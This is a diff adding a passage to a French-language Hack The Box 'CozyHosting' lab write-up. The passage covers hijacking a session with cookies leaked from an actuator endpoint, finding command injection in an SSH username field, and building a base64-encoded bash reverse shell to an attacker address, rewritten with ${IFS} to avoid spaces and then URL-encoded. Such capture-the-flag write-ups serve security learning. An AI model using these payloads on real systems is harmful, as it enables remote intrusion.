@@ -150,3 +150,43 @@ Sur la page web `http://cozyhosting.htb/actuator/sessions`, on trouve une base d
 Aller sur la page de login `http://cozyhosting.htb/login` et rentrer des identifiants pour avoir une session avec des cookies, puis changer les cookies avec ceux trouvé avant de recharger la page.
 
 ++f12++ ou ++ctrl+shift+i++
+
+![Login sessions](img_CozyHosting/login_session.JPG)
+
+En allant dans le sirte on observe une nouvelle zone de login.
+
+#### Burp
+
+Nous rencontrerons une fonction liée à la configuration des connexions SSH.
+
+![Tempory failure in name resolution](<img_CozyHosting/tempory failure in name resolution.JPG>)
+
+Si nous laissons la section 'Param Username' vide, nous observons une erreur liée à une commande SSH, indiquant une potentielle vulnérabilité d'injection de commande dans cette section.
+
+![Error related to an SSH command](<img_CozyHosting/error related to an SSH command.JPG>)
+
+##### Reverse Shell
+
+Création d'un Payload de reverse shell :
+
+```bash
+$ echo "bash -i >& /dev/tcp//7777 0>&1" | base64 -w 0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==
+```
+
+Le reverse shell :
+
+```bash
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==" | base64 -d | bash
+```
+
+Le reverse shell sans espace :
+
+```bash
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8vNzc3NyAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+```
+
+Le reverse shell encodé (https://www.urlencoder.org/) :
+```bash
+%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8vNzc3NyAwPiYxCg%3D%3D%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
+```
